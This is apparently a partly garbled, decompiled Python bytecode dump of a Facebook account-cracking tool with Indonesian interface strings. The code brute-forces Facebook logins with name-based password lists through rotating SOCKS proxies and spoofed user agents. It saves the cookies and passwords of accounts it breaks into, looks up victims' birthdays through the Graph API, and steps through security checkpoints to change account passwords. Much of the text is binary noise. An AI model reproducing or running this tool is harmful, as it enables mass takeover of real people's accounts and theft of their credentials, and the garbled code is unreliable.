v �rld.t"v �rJt#}td/t� d0t� d1t$� t%� d2t� �	� t�d'� t&|||| |� nyd3}td/t� d0t� d1t$� t%� d2t� �	� t�d'� t&|||| |� nWd4t�dt|��v �r�td5ttf � nCtd6d ��d7| � d"|� d#�� td8t� dt� d9t� d:�� n%td;t'� d<t(� d<t)� d=�d ��d7| � d"|� d#�� td>tttt!|�f � t*t!|��D ]}td?t|d@ �� dA�||  � �q�d S tdt� dt� d9t� dB�� tdCd ��d7| � d"|� d#�� d S )DNz�Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]�mbasic.facebook.com��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zgzip, deflater�   )�Hostr�   �accept-encodingr�   r�   r   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8r   �form�method�postr�   r�   �value)Zemail�passr   �action�r�   zTemukan Akun Anda�\<title>(.*?)<\/title>z* %s[%s!%s] Turn on airplanemode 2 seconds�c_userzAkun Anda Dikuncirb   rc   r�   z] Account locked�;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr[   ��.0�keyr  r[   r[   r\   �
<listcomp>   �    zlog_hasil.<locals>.<listcomp>zresults/OKE.txtr�   u   [✓] r�   rQ   r�   re   zAccount unlockedrR   �
checkpoint)�fb_dtsg�jazoest�checkpoint_datazsubmit[Continue]�nhr   c                 S   �   g | ]}|j �qS r[   �r�   )r)  �cekr[   r[   r\   r+  8  �    �optionz.Lihat detail login yang ditampilkan. Ini Anda?rv   z [rd   z] Status : rz   Zadminroy123z$Masukan Kode Masuk untuk Melanjutkanz, [%s!%s] Sorry, the account is installed A2Fzresults/ERROR.txtr�   r.   rs   z] Errorzresults/CP-DETEKTOR-r�   r�   u"    %s[%s•%s] There are %s options z	 [[1;92mr   z[0m] z'] Password is wrong or has been changedzresults/INVALID-OK.txt)+r�   �Sessionr�   �update�bahasar   r�   r�   r  r�   r  r�   r
  r�   rS   rT   rU   r@   r?   r�   �get_dictr^   r�   �itemsr�   r]   r:   rW   rX   �cek_apk�data2�url_mbr	  rh   r�   r�   r_   rB   �ubah_pw�ha�op�targ   )r�   �pasw�sessionZuas_cekdetekdorZsoupZlinkr�   ZurlPost�response�coki�title�link2Z	listInput�anZ	response2Znumberr4  r  Zoptr[   r[   r\   r�   �  sf   
 0�

..2$�"r�   c                 C   s�  i i }}g d�}|d�D ]}|� d�|v r#|�|� d�|� d�i� q| jt|� d� |d�j}	t|	d�}
|
�dd	d
i�}g d�}dt�dt	|	��v r�|
d�D ]}|� d�|v rf|�|� d�|� d�i� qP|�dd�
|�i� | jt|� d� |d�}d�
dd� | j�� �� D ��}tdt� dt� dt� dt� |� dd�
|�� t� �� tdt� d|� t� �� tdd��d|� dd�
|�� d�� t| |� d S d S )N)zsubmit[Yes]r1  r.  r/  r0  r�   r�   r  r!  r"  r   r  r  r  )zsubmit[Next]r1  r.  r/  zBuat Kata Sandi Barur#  Zpassword_newrf   r%  c                 S   r&  r'  r[   r(  r[   r[   r\   r+  �  r,  zubah_pw.<locals>.<listcomp>rb   rc   zTAP-YESre   r�   z	Cookie : zresults/TAB-YES.txtr�   z
[TAP-YES] rQ   )r�   r8  r  r>  r�   r   r  r�   r
  r�   r�   r�   r:  r;  r^   r@   r:   r3   r�   rU   r<  )rD  rE  rH  r�   r  ZdatZdat2Zbutr�   ZubahPwZresUbahZlink3Zbut2�brI  rF  r[   r[   r\   r?  �  s.   
�
�4$�r?  c              	   C   sZ  | j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr2tdtttttf � n!tdt	 � t
t|��D ]}tdt|d || �dd�tf � q>| j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr�tdtttttf � d S tdt � t
t|��D ]}tdt|d || �dd�tf � q�td� d S )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer�   r�   r   r  r  )r  c                 S   r2  r[   r3  �r)  ri   r[   r[   r\   r+    r5  zcek_apk.<locals>.<listcomp>r  r   z. %s[%s!%s] %sSorry there is no Active Apk%s  u+    🎮  %sYour Active Application Details :z %s%s. %s%sr   zDitambahkan padaz Ditambahkan padaz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   r2  r[   r3  rK  r[   r[   r\   r+  4  r5  z0 %s[%s!%s] %sSorry no Expired Apk%s           
u,    🎮  %sYour Expired Application Details :ZKedaluwarsaz Kedaluwarsa�)r�   r�   r   r  r	  rh   r^   r@   r?   r:   rg   r�   )rD  rF  r)   Zsopr�   Zgameri   r[   r[   r\   r<  �  s&   
&
&r<  c                   @   s<   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� ZdS )r�   c                 C   s
   g | _ d S �Nr  )�selfr[   r[   r\   �__init__h  s   
z__crack__.__init__c                 C   s�   t dtttf � tdt� dt� dt� dt� dt� dt� dt� d	��}|d
v r;t dt� dt� dt� d�� | ��  d S |dv rFt�d� d S |dv rQt�d� d S t dt� dt� dt� d�� | ��  d S )Nz�%s##################################################
 [%s!%s] Displaying the application, the account will be easily hit by checkpoints due to using excessive request modules. It is not recommended to display the applicationr.   rc   ro   z] Want to show related apps [rv   r   rp   rq   )Zrchxair�   rt   ru   r�   z] Choose between y/t)	r^   r@   r?   r�   r=   r:   �tampilkan_apk�Apkr�   )rN  Zcrotr[   r[   r\   rP  t  s   4((z__crack__.tampilkan_apkc                    sX  |�_ tdttttt�j �tf � tdttttttf �}|dv r����  tdtttf � tdtt	ttttttttttf � 	 tdttttf �}tdtttt|tf � |d	krftd
tt	tf � n$t|�dkrvtdtt	tf � nd� �fdd�	� t
�  � |�d�� d S qB|dv r����  t
�  ���  d S tdtt	tf � ��|� d S )Nu   
 %s[%s•%s] Total ID : %s%s%szc%s##################################################
 [%s?%s] Enter SC Password (%srequired%s) : %s)ZraraYZrarayzQ%s##################################################
 %sMANUAL PASSWORD DETAILS%su]    %s[%s!%s] Use %sKOMMA%s for separator
 [%s•%s] Example : %sroy123%s,%ssayang%s,%sbismillahTz %s[%s?%s] Enter password : %su%    %s[%s•%s] Active Password : %s%s%srf   �#   
 %s[%s×%s] Sorry, it is wrong...!rw   r�   c                    s�  t dtttf �}|dkrtdtttf � � �  d S |dkrtdttttttf � tdttttttf � tdtttttttttf	 � t	dd	��%}�j
D ]}z|�d
�d }|��j|| d� W qO   Y qOW d   � n1 ssw   Y  ttt� d S |dkr�tdttttttf � tdttttttf � tdtttttttttf	 � t	dd	��%}�j
D ]}z|�d
�d }|��j|| d� W q�   Y q�W d   � n1 s�w   Y  ttt� d S |dk�rKtdttttttf � tdttttttf � tdtttttttttf	 � t	dd	��'}�j
D ]}z|�d
�d }|��j|| d� W �q   Y �qW d   � n	1 �s?w   Y  ttt� d S tdtttf � � �  d S )Nz
 %s[%s?%s] Choose method : rf   rR  r�   �Z%s##################################################
 [%s+%s] OK : results/OK-%s-%s-%s.txt�' %s[%s+%s] CP : results/CP-%s-%s-%s.txt��%s##################################################
 [%s!%s] Must activate airplanemode on ID 30
 [%s!%s] Play back airplanemode every 500 ID
 [%s!%s] To stop %sCTRL+c%s on keyboard
##################################################�   �Zmax_workersr�   r   �free.facebook.comr�   r  rl   u     [%s×%s] Sorry, it is wrong...!)r�   r@   r=   r^   r?   r:   r@  rA  rB  �YayanGantengr�   r�   �submit�
__metode__r�   r�   r�   )ZyscZcinZ__yayanXD__ZikehZkimochi��__yan__rN  r[   r\   r]  �  sV   

��

��

��z __crack__.plerr.<locals>.__yan__�,Zbgsu$    %s[%s×%s] Sorry, wrong SC PasswordrM  )r�   r^   r@   r:   rh   r�   r=   rP  r_   r?   r`   r�   �__pler__r]   r�   )rN  r�   Z___yayanganteng___Zpwekr[   r\  r\   r�   �  s6   $ ) �� U z__crack__.plerrc                  C   s�  t �g d��}tj�dt� |� dt� t� t� dt� t| j	�� dt� dt
� dtt�� t� dt� dtt�� t� d	t
� d
�ttt| j	�� �� t� d�� tj��  zt�d� W n   Y �z�|D �]�}|�� }t�� }t �t�}dd| i}t �t�}	t �t�}
|j�|ddd|	dddddd�
� |�d| d | d �}t�dt|j��� d�t�dt|j��� d�|d| d d|d �}d!�!d"d#� |j"�#� �$� D ��}|d$7 }i d%|�d&d�d'd(�d)d�d*d+�d,d�d-d| �d.d/�d0|	�d1d�d2d3�d4d�d5d�d6d�d7d| d | d �d8d9�d:d�}|j%d| d; |d<|i|d=|d>�}d?|j"�#� v �r�|j"�#� }d@|dA  d! dB|d?   d! dC|dD   d! dE|dF   }dGt&v �rht'dHt
t(||tf � t'dt
� dI|� dJ�� ndKt&v �r�t'dLt
t(||tf � t'dt
� dI|� �� dM||f }t�)|� t*dNt+t,t-f dO��dP| �  n�dQ|j"�#� v �r2zOt*dR��.� }|�dS|� dT|� ���/� dU }|�0d�\}}}t1| }t'dVtt(|||||tf � dW|||||f }t�)|� t*dXt+t,t-f dO��dP| � W  n= t2t3f�y   dY}dY}dY}Y n   Y t'dZtt(||tf � d[||f }t�)|� t*dXt+t,t-f dO��dP| �  nq_td7 aW d S  tj4j5�yM   | �6|||� Y d S w )\N)z
[1;91m[?]z
[1;92m[?]z
[1;93m[?]z
[1;94m[?]z
[1;95m[?]z
[1;96m[?]z
[1;97m[?]rb   r.   r   rc   zOK:z][zCP:z] [z{:.1%}�]r�   Zhttpz	socks4://r�   z?1r�   r  zsame-originZcors�emptyr#   )
r  r�   �sec-ch-ua-mobiler�   r   r�   �sec-fetch-site�sec-fetch-mode�sec-fetch-destr�   zhttps://z"/login/device-based/password/?uid=ah  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdrzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"a  /v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecifiedZlogin_no_pin)Zlsdr/  �uid�nextZflowr   r%  c                 S   r&  r'  r[   r(  r[   r[   r\   r+  �  r,  z(__crack__.__metode__.<locals>.<listcomp>z  m_pixel_ratio=2.625; wd=412x756r  r�   z	sec-ch-uaz(" Not A;Brand";v="99", "Chromium";v="98"rb  zsec-ch-ua-platformz	"Android"r�   r�   r�   z!application/x-www-form-urlencodedr   r�   zx-requested-withZXMLHttpRequestrc  rd  re  r�   r  zgzip, deflate, brr�   z;/login/device-based/validate-password/?shbl=0&locale2=id_IDr�   F)r�   r�   r�   Zallow_redirectsZproxiesr$  zdatr=Zdatrzc_user=zfr=�frzxs=Zxsrp   z= %sLIVE OK %s               
 Username : %s
 Password : %s%szCookie   : rQ   rv   z> %sLIVE OK %s           	    
 Username : %s
 Password : %s%su   [FREE-OK] %s • %szresults/OK-%s-%s-%s.txtr�   z%s
r-  r�   zhttps://graph.facebook.com/z?fields=birthday&access_token=ZbirthdayzX %sLIVE CP %s               
 Username : %s
 Password : %s
 Tanggal Lahir : %s %s %s%s
u    [FREE-CP] %s • %s • %s %s %szresults/CP-%s-%s-%s.txtrf   z> %sLIVE CP %s               
 Username : %s
 Password : %s%s
u   [FREE-CP] %s • %s)7�random�choicerS   rT   rU   r@   �loopr?   rh   r�   r:   r�   r=   r�   �format�floatrV   r�   �mkdir�lowerr�   r7  �prox�ugen�ugen2r�   r8  r�   r�   r�   r�   r�   r�   r�   r�   r:  r;  r  rQ  r^   r�   r�   r�   r@  rA  rB  r�   r�   r�   �	bulan_ttlr�   r�   r�   r�   r[  )rN  Zcebokr�   rC  Zanimasir�   rD  ZnipZproxsZuaZua2�pZdataaZkokiZheadeZpoZcoozrF  Zwrtr�   Zcp_ttl�month�day�yearr[   r[   r\   r[  �  sv   �




"B~"
<




�z__crack__.__metode__c                 C   s�   t dtttf �}|dkrtdtttf � | ��  d S |dv r)d}| �|� d S |dv r6d}| �|� d S |dv rCd	}| �|� d S tdtttf � | ��  d S )
Nz
 %s[%s?%s] Choose Method : rf   rR  r�   rX  r�   r  r�   zm.facebook.com)r�   r@   r=   r^   r?   r_  �kombinasi_pw)rN  Zyanr�   r[   r[   r\   r_  �  s   z__crack__.__pler__c           
      C   s|  t dtttf � t dtttf � t dtttf � t dtttttf � tdt� dt� dt� d��}|d	v rMt d
t� dt� dt� d�� | �|� d S |dv r�t dttttt	t
f � t dttttt	t
f � t dtttttttttf	 � tdd��k}| jD ]_}zX|�d�\}}|�d
�}t|�dks�t|�dks�t|�dks�t|�dkr�||d |d  |d d |d d g}n||d |d  |d d |d d g}|�| j|||� W q�   Y q�W d   � n1 s�w   Y  ttt� d S |dv �r�t dttttt	t
f � t dttttt	t
f � t dtttttttttf	 � tdd��{}| jD ]o}zg|�d�\}}|�d
�}t|�dk�sWt|�dk�sWt|�dk�sWt|�dk�rq||d d |d d |d d |d |d  g}n||d d |d d |d d |d |d  g}|�| j|||� W �q,   Y �q,W d   � n	1 �s�w   Y  ttt� d S |dv �r�t dtttf � t d tttttf � t d!tttttf � td
t� dt� dt� d"t� ���d#�}t dttttt	t
f � t dttttt	t
f � t dtttttttttf	 � tdd���}| jD ]w}zo|�d�\}}|�d
�}t|�dk�sEt|�dk�sEt|�dk�sEt|�dk�rc||d d |d d |d d |d |d  g}	|	| }n||d d |d d |d d |d |d  g}	|	| }|�| j|||� W �q   Y �qW d   � n	1 �s�w   Y  ttt� d S t dt� dt� dt� d$�� | �|� d S )%NzG%s##################################################
 %sPASSWORD MENU%sz! %s[%s1%s] nama,nama123,nama12345z* %s[%s2%s] nama,nama123,nama1234,nama12345z5 %s[%s3%s] nama,nama123,nama1234,nama12345,%s+Sandi%srx   rc   ro   z] Choose Password Method : r�   r.   rs   rt   r�   rS  rT  rU  �#   rW  r�   �   r,   rw   �   r   r   Z123Z12345r�   Z1234r�   zR%s##################################################
 %sADDITIONAL PASSWORD MENU%sz& %s[%s!%s] Use %sKOMMA%s for separatorz1 %s[%s!%s] Example : %ssayang,rahasia,bismillah%sz] Enter additional password : r^  z] Correct input)r^   r@   r_   r:   r�   r=   r?   rx  r@  rA  rB  rY  r�   r�   rh   rZ  r[  r�   r�   r�   )
rN  r  r�   ZkirimZyntktsrf  r�   r  ZpwxZxxxr[   r[   r\   rx  �  s�   *

0*(
��,


842��,
&

82
2��4*z__crack__.kombinasi_pwN)	�__name__�
__module__�__qualname__rO  rP  r�   r[  r_  rx  r[   r[   r[   r\   r�   `  s    8   o@r�   �__main__)�r�   r�   �ImportErrorr^   r�   Zconcurrent.futuresZ
concurrentZbs4r�   rS   r�   rW   ri  r   �
subprocessr   rY  r   ZnowZctru  �nZbulanr�   ZnTemp�
ValueErrorZcurrentrw  rB  Zburv  r@  rA  r�   r�   rB   r?   r:   r=   r4   rG   rA   r@   r3   ZBNZBBLZBPZBBZBKZBHr_   ZBAZmy_colorrj  Zwarnar�   r=  Zamanr�   Zsalahr�   r�   rQ  r�   r�   r�   r�   rk  Z
url_lookupr>  r�   Z	url_graphZheader_gruprs  ZhhhhZiiiiZjjjjZkkkkZddddZeeeeZffffZggggZaaaaZbbbbZccccr9  Z
uas_bawaanZuas_nokiac2Zuas_nokiax20Z
uas_nokiaxZuas_samsungseZuas_redmi9aZuas_nokiaxlZuas_tesZ
uas_randomZuas_nokiac3Z
uas_iphoneZuas_nokia5plusZuas_random2rr  rq  r�   r�   rp  r�   rU   r�   rZ   rg   r  r�   Z	randrangerJ  �c�d�f�g�hri   �j�kZuakur�   Zaa�lZuaku2r]   r`   rj   rm   r�   r�   r�   r�   r!   r�   r�   r�   r�   r�   r�   r�   r�   r�   r?  r<  r�   r|  r[   r[   r[   r\   �<module>   sN  ���P
�
�




��<
B(
    DDH\,  eXl       

�